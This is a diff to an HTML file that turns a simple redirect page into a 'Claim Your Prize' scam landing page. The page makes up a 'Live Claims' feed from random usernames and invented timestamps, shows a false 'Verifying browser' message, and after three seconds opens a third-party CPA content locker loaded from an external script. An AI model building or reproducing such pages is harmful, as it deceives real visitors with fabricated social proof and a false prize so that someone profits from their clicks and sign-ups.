@@ -1,15 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="refresh" content="0; url=https://your-cpa-link.com" />
-  <title>Redirecting...</title>
-  <script>
-    // Fallback in case meta refresh doesn’t work
-    window.location.href = "https://your-cpa-link.com";
-  </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Prize Center</title>
+
+<!-- —————  BASIC STYLING  ————— -->
+<style>
+    :root{
+        --neon:#00faff;
+        --bg:#080b10;
+        --text:#e7f8ff;
+    }
+    *{box-sizing:border-box}
+    body{
+        margin:0;
+        font-family:Segoe UI,Arial,sans-serif;
+        background:var(--bg);
+        color:var(--text);
+        display:flex;
+        flex-direction:column;
+        align-items:center;
+        padding:60px 15px 120px;  /* leave space for dropdown */
+        overflow-x:hidden;
+    }
+    h1{
+        margin:0 0 0.75em;
+        font-size:clamp(1.8rem,5vw,3rem);
+        letter-spacing:.04em;
+        text-shadow:0 0 8px var(--neon);
+    }
+    p.tagline{
+        margin:0 0 2em;
+        opacity:.85;
+    }
+
+    /* — Dropdown holder for the locker — */
+    #locker-drop{
+        position:fixed;
+        top:-110%;               /* start off‑screen */
+        left:0;
+        width:100%;
+        padding:1.2rem 0;
+        background:rgba(12,14,20,.92);
+        backdrop-filter:blur(6px);
+        border-bottom:3px solid var(--neon);
+        box-shadow:0 10px 25px rgba(0,255,255,.25);
+        display:flex;
+        justify-content:center;
+        z-index:9998;            /* locker script injects above */
+        transition:top .6s ease;
+    }
+    #locker-drop.open{ top:0; }
+
+    /* — Live feed — */
+    #live-feed{
+        width:100%;
+        max-width:420px;
+        margin-top:2em;
+        border:1px solid rgba(0,255,255,.25);
+        border-radius:8px;
+        padding:0.75em 1em;
+    }
+    #live-feed h3{
+        margin:0 0 .6em;
+        font-size:1.1rem;
+        color:var(--neon);
+        text-shadow:0 0 4px var(--neon);
+    }
+    #feed-items{
+        list-style:none;
+        margin:0;
+        padding:0;
+        max-height:240px;
+        overflow:hidden;
+        display:flex;
+        flex-direction:column;
+        gap:6px;
+        font-size:.92rem;
+    }
+    .feed-item{
+        opacity:0;
+        transform:translateY(8px);
+        animation:fadeSlide .4s forwards;
+    }
+    @keyframes fadeSlide{
+        to{opacity:1;transform:none}
+    }
+</style>
 </head>
 <body>
-  <p>If you are not redirected automatically, <a href="https://your-cpa-link.com">click here</a>.</p>
+
+<h1>🎉 Claim Your Prize!</h1>
+<p class="tagline">Our system is processing recent winners…</p>
+
+<!-- Fake live‑feed box -->
+<div id="live-feed">
+    <h3>Live Claims</h3>
+    <ul id="feed-items"></ul>
+</div>
+
+<!-- Drop‑down container for the locker -->
+<div id="locker-drop">
+    <span style="opacity:.8">Verifying browser… please complete the quick check below.</span>
+</div>
+
+<!-- —————  YOUR LOCKER SCRIPT  ————— -->
+<script>
+  /* keep these IDs/keys exactly as given */
+  var drIwr_xIs_bBHMTc={it:4515670,key:"96c99"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/4530bac.js"></script>
+
+<!-- —————  PAGE LOGIC  ————— -->
+<script>
+/* 1) slide locker + open after 3 seconds */
+window.addEventListener('load',function(){
+    setTimeout(function(){
+        document.getElementById('locker-drop').classList.add('open');
+        if(typeof _FD==='function') _FD();   // open AdBlueMedia locker
+    },3000);
+});
+
+/* 2) fake live‑feed generator */
+const names=['kjoe.r','Elliot_92','mia.dev','cryptoCat','Luna007','alphaWolf',
+             'SamuraiX','PixelPix','rover.ai','dani_chan','NeoBlade','AriaSky',
+             'ZekePro','betaBeta','Helix42','NovaRay','SodaPop','qubitQ',
+             'Jaxter','omegaLOL','hazard','Firefly','coderKid'];
+let seconds=4;
+function addFeed(){
+    const ul=document.getElementById('feed-items');
+    const name=names[Math.floor(Math.random()*names.length)];
+    const li=document.createElement('li');
+    li.className='feed-item';
+    li.textContent=`${name} just claimed a prize ${seconds} s ago`;
+    ul.prepend(li);
+    // keep max 20 items
+    if(ul.children.length>20) ul.lastElementChild.remove();
+    // randomize next seconds value
+    seconds=Math.floor(Math.random()*8)+2;
+}
+setInterval(addFeed,1500); // new entry every 1.5 s
+// seed initial list
+for(let i=0;i<6;i++) addFeed();
+</script>
+
 </body>
 </html>
